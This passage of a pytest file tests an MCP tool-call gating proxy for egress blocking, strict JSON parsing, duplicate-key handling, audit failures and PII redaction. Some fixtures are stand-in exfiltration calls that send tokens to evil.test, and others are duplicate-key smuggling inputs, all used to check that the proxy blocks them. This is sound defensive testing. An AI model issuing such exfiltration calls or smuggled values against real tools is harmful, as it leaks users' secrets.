"""Tests for the proxy line pump (T4 client side, T5 server side).

Most tests drive `ProxyCore` directly: it is synchronous and does no I/O, so
each rule is one call and one assertion about which bytes went where. The
`TestRunPump` class drives the async loop over in-memory streams for what
only the loop can show: ordering, draining after host EOF, how the session
ends, and the audit failure rule.
"""

from __future__ import annotations

import json
import sqlite3
from types import SimpleNamespace
from typing import Any

import anyio
import pytest

from toolgate.gating.audit import AuditFailure, AuditWriter, Decision, DecisionRecord, Outcome
from toolgate.gating.policy import PolicyConfig
from toolgate.gating.tool_calls import load_tool_call_policy
from toolgate.proxy.lines import Oversize, Tail
from toolgate.proxy.process import SessionEnd
from toolgate.proxy.pump import Effects, ProxyCore, ProxySettings, run_pump

FETCH_SCHEMA = {
    "type": "object",
    "properties": {
        "url": {"type": "string"},
        "max_length": {"type": "integer"},
        "raw": {"type": "boolean"},
    },
    "required": ["url"],
}


def policy_config(
    tool_calls: dict[str, Any] | None = None, *, redaction: tuple[str, ...] = ()
) -> PolicyConfig:
    from toolgate.gating.audit import Decision as D

    return PolicyConfig(
        calibrated=False,
        on_detector_failure=D.ESCALATE,
        injection_detectors=frozenset(),
        redaction_detectors=frozenset(redaction),
        inert_detectors=frozenset(),
        thresholds={"pii": {"redact": 0.7}},
        max_result_chars=200_000,
        tool_calls=load_tool_call_policy(tool_calls),
    )


EGRESS = {"rules": {"fetch.fetch": {"egress": ["docs.example.com"]}}}


class Clock:
    def __init__(self) -> None:
        self.now = 1000.0

    def __call__(self) -> float:
        return self.now


def core(
    tool_calls: dict[str, Any] | None = EGRESS, *, clock: Clock | None = None, **settings: Any
) -> ProxyCore:
    return ProxyCore(
        ProxySettings(name="fetch", policy=policy_config(tool_calls), **settings),
        clock=clock or Clock(),
    )


def line(message: Any) -> bytes:
    return json.dumps(message).encode() + b"\n"


def call(request_id: Any, url: str = "https://docs.example.com/x", **extra: Any) -> bytes:
    arguments = {"url": url, **extra}
    return line(
        {
            "jsonrpc": "2.0",
            "id": request_id,
            "method": "tools/call",
            "params": {"name": "fetch", "arguments": arguments},
        }
    )


def list_request(request_id: Any) -> bytes:
    return line({"jsonrpc": "2.0", "id": request_id, "method": "tools/list"})


def tools_reply(request_id: Any, tools: list[dict[str, Any]]) -> bytes:
    return line({"jsonrpc": "2.0", "id": request_id, "result": {"tools": tools}})


def declare_fetch(proxy: ProxyCore) -> None:
    proxy.client_line(list_request("L"))
    proxy.server_line(tools_reply("L", [{"name": "fetch", "inputSchema": FETCH_SCHEMA}]))


def replies(effects: Effects) -> list[dict[str, Any]]:
    return [json.loads(data) for data in effects.to_client]


def assert_refused(effects: Effects, code: int, request_id: Any) -> None:
    assert effects.to_server == []
    (reply,) = replies(effects)
    assert reply["error"]["code"] == code
    assert reply["id"] == request_id


# --- T4: client -> server --------------------------------------------------------


class TestClientLines:
    def test_an_ordinary_request_is_forwarded_byte_identical(self) -> None:
        raw = b'{"jsonrpc": "2.0",  "id": 7, "method": "ping"}\r\n'
        effects = core().client_line(raw)
        assert effects.to_server == [raw]
        assert effects.to_client == []

    def test_notifications_and_responses_are_forwarded(self) -> None:
        proxy = core()
        for raw in (
            b'{"jsonrpc":"2.0","method":"notifications/initialized"}\n',
            b'{"jsonrpc":"2.0","id":"s1","result":{}}\n',
        ):
            assert proxy.client_line(raw).to_server == [raw]

    @pytest.mark.parametrize(
        "raw",
        [
            b'\xef\xbb\xbf{"jsonrpc":"2.0","id":1,"method":"ping"}\n',
            b'{"jsonrpc":"2.0","id":1,"method":"ping"}{"jsonrpc":"2.0","id":2,"method":"tools/call"}\n',
            b'{"jsonrpc":"2.0","id":1,"method":"ping",}\n',
            b"not json\n",
            b"\n",
            b"42\n",
        ],
    )
    def test_lines_that_are_not_exactly_one_object_get_parse_error(self, raw: bytes) -> None:
        """D5: never forwarded, answered -32700 with id null."""
        assert_refused(core().client_line(raw), -32700, None)

    @pytest.mark.parametrize(
        "raw",
        [
            b'{"jsonrpc":"2.0","id":5,"method":"tools/call","method":"ping","params":{}}\n',
            b'{"jsonrpc":"2.0","id":5,"method":"ping","method":"tools/call","params":{}}\n',
            b'{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"fetch",'
            b'"arguments":{"url":"https://docs.example.com/","url":"https://evil.test/"}}}\n',
        ],
    )
    def test_duplicate_keys_are_refused_with_the_id(self, raw: bytes) -> None:
        """D4: both orders of a duplicate `method`, and a nested duplicate."""
        assert_refused(core().client_line(raw), -32600, 5)

    def test_a_duplicate_id_key_cannot_be_answered_and_is_dropped(self) -> None:
        effects = core().client_line(b'{"jsonrpc":"2.0","id":1,"id":2,"method":"ping"}\n')
        assert effects.to_server == [] and effects.to_client == []
        assert effects.records and effects.messages

    def test_nan_is_refused(self) -> None:
        raw = b'{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"x":NaN}}\n'
        assert_refused(core().client_line(raw), -32600, 3)

    def test_a_batch_is_refused(self) -> None:
        raw = b'[{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{}}]\n'
        effects = core().client_line(raw)
        assert_refused(effects, -32600, None)
        assert "batch" in replies(effects)[0]["error"]["message"]

    @pytest.mark.parametrize("bad_id", [True, [1], {"a": 1}, None])
    def test_a_request_with_an_invalid_id_is_refused(self, bad_id: Any) -> None:
        raw = line({"jsonrpc": "2.0", "id": bad_id, "method": "tools/call", "params": {}})
        assert_refused(core().client_line(raw), -32600, None)

    def test_an_oversize_line_is_answered_when_its_id_is_readable(self) -> None:
        proxy = core()
        assert_refused(proxy.client_event(Oversize(b'{"jsonrpc":"2.0","id":9,"method"')), -32600, 9)
        dropped = proxy.client_event(Oversize(b'{"jsonrpc":"2.0","method":"x","params":"aaa'))
        assert dropped.to_server == [] and dropped.to_client == [] and dropped.records

    def test_an_unterminated_tail_is_dropped(self) -> None:
        effects = core().client_event(Tail(call(1)[:-1]))
        assert effects.to_server == [] and effects.to_client == []


class TestToolCalls:
    def test_an_allowed_call_is_forwarded_byte_identical_and_tracked(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        raw = call(1)
        effects = proxy.client_line(raw)
        assert effects.to_server == [raw]
        assert ("number", 1) in proxy.pending
        assert effects.records == []  # allowed calls get their row with the result

    def test_a_blocked_call_is_answered_locally_and_never_forwarded(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        effects = proxy.client_line(call("c1", "https://evil.test/?d=secret-token"))
        assert effects.to_server == []
        (reply,) = replies(effects)
        assert reply["id"] == "c1"
        assert reply["result"]["isError"] is True
        assert reply["result"]["content"][0]["text"] == (
            "Blocked by toolgate policy: rule fetch.fetch.egress"
        )
        (record,) = effects.records
        assert record.fused_decision is Decision.BLOCK
        assert record.outcome is Outcome.TOOL_CALL
        assert record.note is not None and "fetch.fetch.egress" in record.note
        assert ("string", "c1") not in proxy.pending

    def test_the_blocked_reply_and_audit_row_never_echo_the_argument(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        effects = proxy.client_line(call(1, "https://evil.test/?d=sk-live-123"))
        assert b"sk-live" not in b"".join(effects.to_client)
        assert all("sk-live" not in str(r) for r in effects.records)
        assert all("sk-live" not in m for m in effects.messages)

    def test_a_call_before_any_tools_list_is_blocked(self) -> None:
        effects = core().client_line(call(1))
        assert replies(effects)[0]["result"]["content"][0]["text"].endswith("fetch.fetch.args")

    def test_an_undeclared_argument_is_blocked(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        effects = proxy.client_line(call(1, target="https://evil.test/"))
        assert effects.to_server == []
        assert "fetch.fetch.args" in replies(effects)[0]["result"]["content"][0]["text"]

    @pytest.mark.parametrize(
        ("params", "rule"),
        [
            ({"name": 7, "arguments": {}}, "fetch.*.args"),
            ({"arguments": {}}, "fetch.*.args"),
            ({"name": "fetch", "arguments": "x"}, "fetch.fetch.args"),
            ({"name": "fetch", "arguments": [1]}, "fetch.fetch.args"),
            ("not-an-object", "fetch.*.args"),
        ],
    )
    def test_malformed_params_are_blocked(self, params: Any, rule: str) -> None:
        """R2-5: a tools/call the gate cannot read is refused, not forwarded."""
        raw = line({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": params})
        effects = core().client_line(raw)
        assert effects.to_server == []
        assert replies(effects)[0]["result"]["content"][0]["text"].endswith(rule)

    def test_a_tool_without_a_rule_needs_no_declaration(self) -> None:
        raw = line({"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "other"}})
        assert core().client_line(raw).to_server == [raw]

    def test_escalate_forwards_and_logs(self) -> None:
        proxy = core({"rules": {"fetch.fetch": {"action": "escalate"}}})
        raw = call(1)
        effects = proxy.client_line(raw)
        assert effects.to_server == [raw]
        assert effects.records[0].fused_decision is Decision.ESCALATE

    def test_a_gate_exception_fails_closed(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import toolgate.proxy.pump as pump_module

        def boom(*_a: Any, **_k: Any) -> Any:
            raise RuntimeError("bug")

        monkeypatch.setattr(pump_module, "evaluate_tool_call", boom)
        effects = core().client_line(call(1))
        assert effects.to_server == []
        assert replies(effects)[0]["result"]["isError"] is True

    def test_a_tools_call_sent_as_a_notification_is_gated(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        bad = line(
            {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {"name": "fetch", "arguments": {"url": "https://evil.test/"}},
            }
        )
        good = line(
            {
                "jsonrpc": "2.0",
                "method": "tools/call",
                "params": {"name": "fetch", "arguments": {"url": "https://docs.example.com/"}},
            }
        )
        blocked = proxy.client_line(bad)
        assert blocked.to_server == [] and blocked.to_client == [] and blocked.records
        assert proxy.client_line(good).to_server == [good]


class TestBookkeeping:
    def test_ids_are_tracked_by_json_type(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        proxy.client_line(call(1))
        assert proxy.client_line(call("1")).to_server  # "1" is not 1

    def test_a_duplicate_in_flight_tools_call_id_is_refused(self) -> None:
        """D13."""
        proxy = core()
        declare_fetch(proxy)
        proxy.client_line(call(1))
        assert_refused(proxy.client_line(call(1)), -32600, 1)

    def test_a_ping_colliding_with_a_pending_call_is_refused(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        proxy.client_line(call(4))
        effects = proxy.client_line(line({"jsonrpc": "2.0", "id": 4, "method": "ping"}))
        assert_refused(effects, -32600, 4)
        assert replies(effects)[0]["error"]["message"] == "duplicate request id"

    def test_a_reply_clears_the_entry(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        proxy.client_line(call(1))
        proxy.server_line(line({"jsonrpc": "2.0", "id": 1, "result": {"content": []}}))
        assert proxy.pending == {}

    def test_full_pending_map_blocks_instead_of_evicting(self) -> None:
        proxy = core(max_pending=2)
        declare_fetch(proxy)
        proxy.client_line(call(1))
        proxy.client_line(call(2))
        effects = proxy.client_line(call(3))
        assert effects.to_server == []
        assert replies(effects)[0]["result"]["content"][0]["text"].endswith("fetch.fetch.capacity")
        assert set(proxy.pending) == {("number", 1), ("number", 2)}  # nothing evicted

    def test_a_capacity_blocked_tools_list_gets_a_json_rpc_error(self) -> None:
        """R3-7: a tools/list cannot be answered with a CallToolResult."""
        proxy = core(max_pending=1)
        declare_fetch(proxy)
        proxy.client_line(call(1))
        effects = proxy.client_line(list_request("L2"))
        assert_refused(effects, -32000, "L2")
        assert "fetch.*.capacity" in (effects.records[0].note or "")

    def test_cancel_for_a_locally_answered_id_is_dropped(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        proxy.client_line(call(1, "https://evil.test/"))
        cancel = line(
            {"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 1}}
        )
        assert proxy.client_line(cancel).to_server == []

    def test_cancel_for_a_forwarded_id_marks_it_and_frees_capacity(self) -> None:
        """D12: the entry stays (a late reply is still inspected) but stops counting."""
        proxy = core(max_pending=1)
        declare_fetch(proxy)
        proxy.client_line(call(1))
        cancel = line(
            {"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 1}}
        )
        assert proxy.client_line(cancel).to_server == [cancel]
        assert proxy.pending[("number", 1)].cancelled
        assert proxy.client_line(call(2)).to_server  # capacity is free again
        assert ("number", 1) in proxy.pending

    def test_capacity_after_many_cancellations_stays_usable(self) -> None:
        proxy = core(max_pending=2)
        declare_fetch(proxy)
        cancel = "notifications/cancelled"
        for i in range(6):
            proxy.client_line(call(i))
            proxy.client_line(
                line({"jsonrpc": "2.0", "method": cancel, "params": {"requestId": i}})
            )
        assert proxy.client_line(call(100)).to_server

    def test_unanswered_entries_expire_and_a_late_reply_is_dropped(self) -> None:
        """D12: 300 s expiry, logged; the reply that comes later never reaches the host."""
        clock = Clock()
        proxy = core(clock=clock)
        declare_fetch(proxy)
        proxy.client_line(call(1))
        clock.now += 299
        assert proxy.sweep().records == []
        clock.now += 2
        expired = proxy.sweep()
        assert proxy.pending == {}
        assert "expired" in (expired.records[0].note or "")
        late = proxy.server_line(line({"jsonrpc": "2.0", "id": 1, "result": {"content": []}}))
        assert late.to_client == [] and late.records

    def test_reusing_an_answered_id_starts_afresh(self) -> None:
        proxy = core()
        declare_fetch(proxy)
        proxy.client_line(call(1, "https://evil.test/"))
        assert proxy.client_line(call(1)).to_server


# --- the async loop ---------------------------------------------------------------


class MemoryHost:
    def __init__(self) -> None:
        self.send_in, self.receive_in = anyio.create_memory_object_stream[bytes](100)
        self.out = bytearray()

    async def receive(self) -> bytes:
        try:
            return await self.receive_in.receive()
        except anyio.EndOfStream:
            return b""

    async def send(self, data: bytes) -> None:
        self.out += data

    def lines(self) -> list[dict[str, Any]]:
        return [json.loads(x) for x in bytes(self.out).splitlines() if x.strip()]


class FakeChild:
    """The server end, in memory: what the proxy sends, and what it reads."""

    def __init__(self) -> None:
        self.to_child_send, self.to_child_receive = anyio.create_memory_object_stream[bytes](100)
        self.from_child_send, self.from_child_receive = anyio.create_memory_object_stream[bytes](
            100
        )
        self.received: list[bytes] = []
        self.stdin = SimpleNamespace(send=self._stdin_send, aclose=self._stdin_close)
        self.stdout = SimpleNamespace(receive=self.from_child_receive.receive)
        self.stdin_closed = False

    async def _stdin_send(self, data: bytes) -> None:
        if self.stdin_closed:
            raise anyio.ClosedResourceError
        self.received.append(data)
        await self.to_child_send.send(data)

    async def _stdin_close(self) -> None:
        self.stdin_closed = True
        await self.to_child_send.aclose()


class EchoServer:
    """Answers each request; `tools/list` declares fetch; calls echo `ok`."""

    def __init__(self, child: FakeChild) -> None:
        self.child = child

    async def run(self) -> None:
        async for data in self.child.to_child_receive:
            message = json.loads(data)
            if "id" not in message:
                continue
            if message.get("method") == "tools/list":
                reply = tools_reply(message["id"], [{"name": "fetch", "inputSchema": FETCH_SCHEMA}])
            else:
                reply = line(
                    {
                        "jsonrpc": "2.0",
                        "id": message["id"],
                        "result": {"content": [{"type": "text", "text": "ok"}]},
                    }
                )
            await self.child.from_child_send.send(reply)
        await self.child.from_child_send.aclose()


class ListLog:
    def __init__(self, failing: bool = False) -> None:
        self.rows: list[DecisionRecord] = []
        self.failing = failing

    def append(self, record: DecisionRecord) -> None:
        if self.failing:
            raise sqlite3.OperationalError("disk I/O error")
        self.rows.append(record)


async def _session(
    client_lines: list[bytes],
    *,
    log: ListLog | None = None,
    close_host: bool = True,
    **settings: Any,
) -> tuple[SessionEnd, MemoryHost, FakeChild, ListLog]:
    host, child = MemoryHost(), FakeChild()
    log = log or ListLog()
    proxy = ProxyCore(ProxySettings(name="fetch", policy=policy_config(EGRESS), **settings))
    writer = AuditWriter(log, report=lambda _m: None)  # type: ignore[arg-type]

    async def feed() -> None:
        """Send each line; after a request, wait for its reply, as a host does."""
        for data in client_lines:
            await host.send_in.send(data)
            message = json.loads(data)
            if (
                "id" in message
                and "method" in message
                and not str(message["method"]).startswith("notifications/")
            ):
                with anyio.fail_after(5):
                    while all(m.get("id") != message["id"] for m in host.lines()):
                        await anyio.sleep(0.005)
        if close_host:
            await host.send_in.aclose()

    async with anyio.create_task_group() as tg:
        tg.start_soon(EchoServer(child).run)
        tg.start_soon(feed)
        with anyio.fail_after(10):
            end = await run_pump(child, host, proxy, audit=writer, report=lambda _m: None)  # type: ignore[arg-type]
        tg.cancel_scope.cancel()
    return end, host, child, log


class TestRunPump:
    async def test_replies_in_flight_still_reach_the_host_after_host_eof(self) -> None:
        end, host, _child, _log = await _session([list_request(1), call(2)])
        assert end is SessionEnd.HOST_CLOSED
        assert [m["id"] for m in host.lines()] == [1, 2]

    async def test_order_within_a_direction_is_arrival_order(self) -> None:
        """D14: a cancel sent right after its call reaches the server after it."""
        cancel = line(
            {"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 2}}
        )
        ping = line({"jsonrpc": "2.0", "id": 3, "method": "ping"})
        _end, _host, child, _log = await _session([list_request(1), call(2), cancel, ping])
        assert child.received == [list_request(1), call(2), cancel, ping]

    async def test_a_blocked_call_never_reaches_the_server(self) -> None:
        _end, host, child, log = await _session(
            [list_request(1), call(2, "https://evil.test/?d=x")]
        )
        assert child.received == [list_request(1)]
        assert host.lines()[1]["result"]["isError"] is True
        assert [r.fused_decision for r in log.rows] == [Decision.BLOCK]

    async def test_server_closing_first_is_child_closed(self) -> None:
        host, child = MemoryHost(), FakeChild()
        proxy = core()
        await child.from_child_send.aclose()
        with anyio.fail_after(5):
            end = await run_pump(child, host, proxy, report=lambda _m: None)  # type: ignore[arg-type]
        assert end is SessionEnd.CHILD_CLOSED

    async def test_an_audit_failure_on_a_block_keeps_the_block(self) -> None:
        """D10: the call is still refused and the refusal still reaches the host."""
        _end, host, child, _log = await _session(
            [list_request(1), call(2, "https://evil.test/")], log=ListLog(failing=True)
        )
        assert child.received == [list_request(1)]
        assert host.lines()[1]["result"]["isError"] is True

    async def test_an_audit_failure_on_an_allow_still_forwards(self) -> None:
        cfg = {"rules": {"fetch.fetch": {"action": "escalate"}}}
        host, child = MemoryHost(), FakeChild()
        proxy = ProxyCore(ProxySettings(name="fetch", policy=policy_config(cfg)))
        writer = AuditWriter(ListLog(failing=True), report=lambda _m: None)  # type: ignore[arg-type]
        await host.send_in.send(call(1))
        await host.send_in.aclose()
        async with anyio.create_task_group() as tg:
            tg.start_soon(EchoServer(child).run)
            with anyio.fail_after(10):
                await run_pump(child, host, proxy, audit=writer, report=lambda _m: None)  # type: ignore[arg-type]
            tg.cancel_scope.cancel()
        assert child.received == [call(1)]
        assert host.lines()[0]["result"]["content"][0]["text"] == "ok"

    async def test_ten_consecutive_audit_failures_end_the_session(self) -> None:
        """D10: the tenth failure raises, which `run_session` maps to exit 3."""
        blocked = [call(i, "https://evil.test/") for i in range(2, 12)]
        with pytest.raises(BaseExceptionGroup) as excinfo:
            await _session([list_request(1), *blocked], log=ListLog(failing=True))
        assert excinfo.group_contains(AuditFailure)


# --- T5: server -> client ------------------------------------------------------------

EMAIL = "alice.smith@example.com"


def redacting_core(**settings: Any) -> ProxyCore:
    return ProxyCore(
        ProxySettings(name="fetch", policy=policy_config(EGRESS, redaction=("pii",)), **settings)
    )


def result_line(request_id: Any, *texts: str, **extra: Any) -> bytes:
    content = [{"type": "text", "text": t} for t in texts]
    return line({"jsonrpc": "2.0", "id": request_id, "result": {"content": content, **extra}})


def tracked_call(proxy: ProxyCore, request_id: Any = 1) -> None:
    declare_fetch(proxy)
    assert proxy.client_line(call(request_id)).to_server


class TestToolResults:
    def test_a_clean_result_is_forwarded_byte_identical_and_logged(self) -> None:
        proxy = redacting_core()
        tracked_call(proxy)
        raw = (
            b'{"jsonrpc": "2.0", "id": 1, '
            b'"result": {"content": [{"type": "text", "text": "hi"}]}}\n'
        )
        effects = proxy.server_line(raw)
        assert effects.to_client == [raw]
        (record,) = effects.records
        assert record.outcome is Outcome.RESULT and record.fused_decision is Decision.ALLOW
        assert record.raw_result_hash and record.tool_name == "fetch"

    def test_pii_is_redacted_when_redaction_is_configured(self) -> None:
        proxy = redacting_core()
        tracked_call(proxy)
        effects = proxy.server_line(result_line(1, f"contact {EMAIL} today"))
        text = replies(effects)[0]["result"]["content"][0]["text"]
        assert EMAIL not in text
        assert effects.records[0].redacted
        assert EMAIL not in str(effects.records[0])

    def test_pii_passes_when_redaction_is_off(self) -> None:
        proxy = core()
        tracked_call(proxy)
        raw = result_line(1, f"contact {EMAIL}")
        assert proxy.server_line(raw).to_client == [raw]

    def test_redaction_keeps_unknown_fields(self) -> None:
        proxy = redacting_core()
        tracked_call(proxy)
        raw = result_line(1, EMAIL, structuredContent={"k": 1}, _meta={"x": "y"})
        reply = replies(proxy.server_line(raw))[0]
        assert reply["result"]["structuredContent"] == {"k": 1}
        assert reply["result"]["_meta"] == {"x": "y"}

    def test_a_late_reply_to_a_cancelled_call_is_still_redacted(self) -> None:
        """D12: cancelled, then answered anyway: inspected, then forwarded."""
        proxy = redacting_core()
        tracked_call(proxy)
        proxy.client_line(
            line(
                {"jsonrpc": "2.0", "method": "notifications/cancelled", "params": {"requestId": 1}}
            )
        )
        effects = proxy.server_line(result_line(1, EMAIL))
        assert EMAIL not in effects.to_client[0].decode()
        assert "cancelled" in (effects.records[0].note or "")

    def test_a_json_rpc_error_reply_is_forwarded_and_logged(self) -> None:
        proxy = redacting_core()
        tracked_call(proxy)
        raw = line({"jsonrpc": "2.0", "id": 1, "error": {"code": -32602, "message": "bad"}})
        effects = proxy.server_line(raw)
        assert effects.to_client == [raw]
        assert effects.records[0].outcome is Outcome.PROTOCOL_ERROR

    @pytest.mark.parametrize(
        "result",
        [["not", "an", "object"], {"content": "not-a-list"}, "text"],
    )
    def test_a_malformed_result_is_replaced_when_redaction_is_on(self, result: Any) -> None:
        """R2-5: a result that cannot be inspected is not forwarded unredacted."""
        proxy = redacting_core()
        tracked_call(proxy)
        effects = proxy.server_line(line({"jsonrpc": "2.0", "id": 1, "result": result}))
        reply = replies(effects)[0]
        assert reply["result"]["isError"] is True
        assert reply["result"]["content"][0]["text"] == "result could not be inspected by toolgate"

    def test_a_malformed_result_is_forwarded_when_redaction_is_off(self) -> None:
        proxy = core()
        tracked_call(proxy)
        raw = line({"jsonrpc": "2.0", "id": 1, "result": {"content": "not-a-list"}})
        effects = proxy.server_line(raw)
        assert effects.to_client == [raw]
        assert effects.records[0].malformed

    def test_an_inspection_error_fails_closed_with_redaction(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import toolgate.proxy.pump as pump_module

        def boom(*_a: Any, **_k: Any) -> Any:
            raise RuntimeError("bug")

        monkeypatch.setattr(pump_module, "scan_normalised", boom)
        proxy = redacting_core()
        tracked_call(proxy)
        effects = proxy.server_line(result_line(1, EMAIL))
        assert EMAIL.encode() not in b"".join(effects.to_client)

    def test_an_eight_mib_result_passes_through(self) -> None:
        proxy = core()
        tracked_call(proxy)
        raw = result_line(1, "a" * (8 * 1024 * 1024))
        assert proxy.server_line(raw).to_client == [raw]


class TestStrictServerReplies:
    """D7 / R3-3: tracked replies are parsed as strictly as client lines."""

    def test_a_duplicate_key_call_reply_is_replaced_when_redaction_is_on(self) -> None:
        proxy = redacting_core()
        tracked_call(proxy)
        raw = (
            b'{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text",'
            b'"text":"' + EMAIL.encode() + b'","text":"clean"}]}}\n'
        )
        effects = proxy.server_line(raw)
        assert EMAIL.encode() not in b"".join(effects.to_client)
        assert replies(effects)[0]["result"]["isError"] is True

    def test_a_duplicate_key_call_reply_is_forwarded_when_redaction_is_off(self) -> None:
        proxy = core()
        tracked_call(proxy)
        raw = b'{"jsonrpc":"2.0","id":1,"result":{"content":[],"content":[]}}\n'
        effects = proxy.server_line(raw)
        assert effects.to_client == [raw]
        assert proxy.pending == {}
        assert "strict" in (effects.records[0].malformed or "")

    def test_a_duplicate_key_tools_list_becomes_empty(self) -> None:
        proxy = core()
        proxy.client_line(list_request("L"))
        raw = (
            b'{"jsonrpc":"2.0","id":"L","result":{"tools":[{"name":"fetch",'
            b'"description":"safe","description":"evil","inputSchema":{}}]}}\n'
        )
        effects = proxy.server_line(raw)
        assert replies(effects)[0]["result"] == {"tools": []}
        assert "fetch.*.declarations" in (effects.records[0].note or "")

    def test_a_duplicate_id_cannot_smuggle_a_tracked_reply(self) -> None:
        """Python reads id 99 (untracked); a first-wins host would read id 1."""
        proxy = redacting_core()
        tracked_call(proxy)
        raw = (
            b'{"jsonrpc":"2.0","id":1,"id":99,"result":{"content":[{"type":"text","text":"'
            + EMAIL.encode()
            + b'"}]}}\n'
        )
        effects = proxy.server_line(raw)
        assert EMAIL.encode() not in b"".join(effects.to_client)
        assert proxy.pending == {}

    def test_a_tracked_id_in_second_place_is_found_too(self) -> None:
        """Python reads id 1 (tracked) here; the prefix scan alone would see 99."""
        proxy = redacting_core()
        tracked_call(proxy)
        raw = (
            b'{"jsonrpc":"2.0","id":99,"id":1,"result":{"content":[{"type":"text","text":"'
            + EMAIL.encode()
            + b'"}]}}\n'
        )
        effects = proxy.server_line(raw)
        assert EMAIL.encode() not in b"".join(effects.to_client)
        assert proxy.pending == {}

    def test_an_untracked_non_json_line_is_forwarded_unchanged(self) -> None:
        raw = b"server debug output\n"
        effects = core().server_line(raw)
        assert effects.to_client == [raw] and effects.messages

    def test_server_requests_and_notifications_pass_unchanged(self) -> None:
        proxy = core()
        for raw in (
            b'{"jsonrpc":"2.0","id":"s1","method":"sampling/createMessage","params":{}}\n',
            b'{"jsonrpc":"2.0","method":"notifications/progress","params":{"progress":1}}\n',
            b'{"jsonrpc":"2.0","id":77,"result":{}}\n',
        ):
            assert proxy.server_line(raw).to_client == [raw]


class TestDeclarations:
    WRITE_SCHEMA = {
        "type": "object",
        "properties": {"path": {"type": "string"}, "content": {"type": "string"}},
    }

    def fs_core(self, **rule: Any) -> ProxyCore:
        tool_calls = {"rules": {"fs.write_file": {"paths": ["/w/**"], **rule}}}
        return ProxyCore(ProxySettings(name="fs", policy=policy_config(tool_calls)))

    def test_a_fully_classified_list_is_forwarded_byte_identical(self) -> None:
        proxy = self.fs_core(path_args=["path"], ignore_args=["content"])
        proxy.client_line(list_request(1))
        raw = tools_reply(1, [{"name": "write_file", "inputSchema": self.WRITE_SCHEMA}])
        assert proxy.server_line(raw).to_client == [raw]

    def test_an_unclassified_tool_is_withheld_and_named_on_stderr(self) -> None:
        proxy = self.fs_core()
        proxy.client_line(list_request(1))
        effects = proxy.server_line(
            tools_reply(
                1,
                [
                    {"name": "write_file", "inputSchema": self.WRITE_SCHEMA, "x-extra": True},
                    {"name": "other", "inputSchema": {}, "x-extra": {"keep": 1}},
                ],
            )
        )
        reply = replies(effects)[0]
        assert [t["name"] for t in reply["result"]["tools"]] == ["other"]
        assert reply["result"]["tools"][0]["x-extra"] == {"keep": 1}  # unknown fields survive
        assert any("content" in m and "ignore_args" in m for m in effects.messages)
        assert "fs.write_file.args" in (effects.records[0].note or "")
        assert effects.records[0].outcome is Outcome.TOOL_DECLARATION

    def test_a_call_to_a_withheld_tool_is_blocked(self) -> None:
        proxy = self.fs_core()
        proxy.client_line(list_request(1))
        proxy.server_line(
            tools_reply(1, [{"name": "write_file", "inputSchema": self.WRITE_SCHEMA}])
        )
        raw = line(
            {
                "jsonrpc": "2.0",
                "id": 2,
                "method": "tools/call",
                "params": {"name": "write_file", "arguments": {"path": "/w/a", "content": "x"}},
            }
        )
        effects = proxy.client_line(raw)
        assert effects.to_server == []
        assert replies(effects)[0]["result"]["content"][0]["text"].endswith("fs.write_file.args")

    @pytest.mark.parametrize(
        "result",
        [
            {"tools": "nope"},
            {"tools": [{"inputSchema": {}}]},
            {"tools": [{"name": 3}]},
            {"tools": ["write_file"]},
            "nope",
            {},
        ],
    )
    def test_an_unreadable_list_becomes_empty(self, result: Any) -> None:
        proxy = self.fs_core()
        proxy.client_line(list_request(1))
        effects = proxy.server_line(line({"jsonrpc": "2.0", "id": 1, "result": result}))
        assert replies(effects)[0]["result"] == {"tools": []}
        assert "fs.*.declarations" in (effects.records[0].note or "")

    def test_pages_are_handled_one_by_one(self) -> None:
        """R2-10: classification is per declaration, so each page stands alone."""
        proxy = self.fs_core(path_args=["path"], ignore_args=["content"])
        proxy.client_line(list_request(1))
        page1 = line(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "result": {"tools": [{"name": "a", "inputSchema": {}}], "nextCursor": "c2"},
            }
        )
        assert proxy.server_line(page1).to_client == [page1]
        proxy.client_line(
            line({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {"cursor": "c2"}})
        )
        page2 = tools_reply(2, [{"name": "write_file", "inputSchema": self.WRITE_SCHEMA}])
        assert proxy.server_line(page2).to_client == [page2]
        assert set(proxy.schemas) == {"a", "write_file"}

    def test_an_error_reply_to_tools_list_is_forwarded(self) -> None:
        proxy = self.fs_core()
        proxy.client_line(list_request(1))
        raw = line({"jsonrpc": "2.0", "id": 1, "error": {"code": -32601, "message": "no"}})
        assert proxy.server_line(raw).to_client == [raw]


class TestDroppedServerLines:
    """D8: a dropped line that answers a tracked request gets -32603, not a hang."""

    def test_an_oversize_result_is_answered_and_the_late_copy_dropped(self) -> None:
        proxy = core()
        tracked_call(proxy, 5)
        effects = proxy.server_event(Oversize(b'{"jsonrpc":"2.0","id":5,"result":{"content":[{'))
        (reply,) = replies(effects)
        assert reply["id"] == 5 and reply["error"]["code"] == -32603
        assert "response dropped by toolgate" in reply["error"]["message"]
        assert proxy.pending == {}
        late = proxy.server_line(result_line(5, "late"))
        assert late.to_client == []

    def test_an_oversize_line_with_no_tracked_id_is_dropped_and_logged(self) -> None:
        effects = core().server_event(Oversize(b'{"jsonrpc":"2.0","method":"notifications/x"'))
        assert effects.to_client == [] and effects.records and effects.messages

    def test_a_batched_reply_is_dropped_and_tracked_ids_answered(self) -> None:
        proxy = core()
        tracked_call(proxy, 1)
        proxy.client_line(call(2))
        raw = line(
            [
